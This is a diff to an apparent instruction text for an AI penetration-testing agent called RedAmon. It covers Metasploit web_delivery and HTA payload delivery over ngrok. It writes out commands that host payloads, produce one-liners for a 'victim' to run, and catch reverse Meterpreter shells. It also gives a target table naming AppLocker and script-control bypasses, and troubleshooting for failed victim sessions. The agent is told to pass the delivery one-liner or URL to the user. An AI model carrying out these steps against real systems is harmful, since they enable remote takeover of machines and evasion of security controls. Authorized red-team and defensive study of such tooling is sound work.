@@ -166,21 +166,32 @@ kali_shell: "cp /root/.msf4/local/<filename> /tmp/ && ls -la /tmp/<filename>"
 
 Host a payload on a web server and generate a one-liner for the target to execute.
 
+**⚠ NGROK / SINGLE-TUNNEL LIMITATION:**
+Web delivery requires TWO open ports reachable by the victim:
+1. **SRVPORT** (e.g. 8080) — HTTP server that serves the payload download
+2. **LPORT** (e.g. 4444) — reverse handler that catches the Meterpreter callback
+
+If ngrok (or any single tunnel) is active, it only forwards ONE port (LPORT for the reverse handler).
+The victim CANNOT reach SRVPORT through that same tunnel, so the payload download silently fails and no session is created.
+
+**→ If using ngrok / single tunnel: DO NOT use web_delivery. Use Method A (msfvenom standalone payload) instead.**
+**→ Web delivery only works when the victim can directly reach BOTH ports** (same LAN, VPN, or multiple tunnels).
+
 ```
 use exploit/multi/script/web_delivery; set TARGET <target_number>; set PAYLOAD <payload>; set LHOST <LHOST>; set LPORT <LPORT>; set SRVHOST 0.0.0.0; set SRVPORT <srv_port>; run -j
 ```
 
-**Target Selection (if ngrok active, use stageless `_` column):**
+**Target Selection:**
 
-| TARGET # | Language | One-liner runs on | Payload (no ngrok) | Payload (ngrok — stageless) |
-|----------|----------|-------------------|--------------------|-----------------------------|
-| 0 | Python | Linux/macOS/Win with Python | `python/meterpreter/reverse_tcp` | `python/meterpreter_reverse_tcp` |
-| 1 | PHP | Web server with PHP | `php/meterpreter/reverse_tcp` | `php/meterpreter_reverse_tcp` |
-| 2 | PSH (PowerShell) | Windows | `windows/meterpreter/reverse_tcp` | `windows/meterpreter_reverse_tcp` |
-| 3 | Regsvr32 | Windows (AppLocker bypass) | `windows/meterpreter/reverse_tcp` | `windows/meterpreter_reverse_tcp` |
-| 4 | pubprn | Windows (script bypass) | `windows/meterpreter/reverse_tcp` | `windows/meterpreter_reverse_tcp` |
-| 5 | SyncAppvPublishingServer | Windows (bypass) | `windows/meterpreter/reverse_tcp` | `windows/meterpreter_reverse_tcp` |
-| 6 | PSH (Binary) | Windows | `windows/meterpreter/reverse_tcp` | `windows/meterpreter_reverse_tcp` |
+| TARGET # | Language | One-liner runs on | Payload |
+|----------|----------|-------------------|---------|
+| 0 | Python | Linux/macOS/Win with Python | `python/meterpreter/reverse_tcp` |
+| 1 | PHP | Web server with PHP | `php/meterpreter/reverse_tcp` |
+| 2 | PSH (PowerShell) | Windows | `windows/meterpreter/reverse_tcp` |
+| 3 | Regsvr32 | Windows (AppLocker bypass) | `windows/meterpreter/reverse_tcp` |
+| 4 | pubprn | Windows (script bypass) | `windows/meterpreter/reverse_tcp` |
+| 5 | SyncAppvPublishingServer | Windows (bypass) | `windows/meterpreter/reverse_tcp` |
+| 6 | PSH (Binary) | Windows | `windows/meterpreter/reverse_tcp` |
 
 **After running:** The module prints a one-liner command. Copy this — it IS the delivery payload.
 The web_delivery server runs as a background job until the target executes the one-liner.
@@ -190,6 +201,10 @@ The web_delivery server runs as a background job until the target executes the o
 #### Method D: HTA Delivery Server (`metasploit_console`)
 
 Host an HTA (HTML Application) that executes a payload when opened in a browser.
+
+**⚠ Same NGROK / SINGLE-TUNNEL LIMITATION as Method C:**
+HTA delivery also requires two reachable ports (SRVPORT for the HTA download + LPORT for the reverse callback).
+**→ If using ngrok / single tunnel: DO NOT use HTA delivery. Use Method A (msfvenom standalone payload) instead.**
 
 ```
 use exploit/windows/misc/hta_server; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST <LHOST>; set LPORT <LPORT>; set SRVHOST 0.0.0.0; set SRVPORT 8080; run -j
@@ -247,6 +262,8 @@ Report the one-liner command (Method C) or URL (Method D) to the user.
 | Session opens then dies instantly (ngrok) | You are using a STAGED payload — switch to STAGELESS (e.g. `meterpreter_reverse_tcp` not `meterpreter/reverse_tcp`). |
 | "Payload is too large" | Use staged payload (e.g., `reverse_tcp` not `reverse_tcp_rc4`) or different encoder. |
 | Web delivery one-liner blocked | Try different TARGET (Regsvr32=3 for AppLocker bypass). |
+| Web delivery: victim runs one-liner but no session (ngrok) | Web delivery CANNOT work through a single ngrok tunnel — it needs TWO ports (SRVPORT for download + LPORT for callback). Switch to Method A (msfvenom standalone payload) which only needs one tunnel for LPORT. |
+| HTA delivery: victim visits URL but no session (ngrok) | Same as web delivery — HTA server needs SRVPORT reachable too. Use Method A instead. |
 | No session appears in RedAmon UI | You used `nc`/`netcat`/`socat` instead of Metasploit `exploit/multi/handler`. Kill the netcat listener and set up a proper handler via `metasploit_console`. Only Metasploit sessions are tracked by RedAmon. |
 | **Same approach fails 3+ times** | **STOP. Use action="ask_user" to discuss alternative approaches.** |
 """
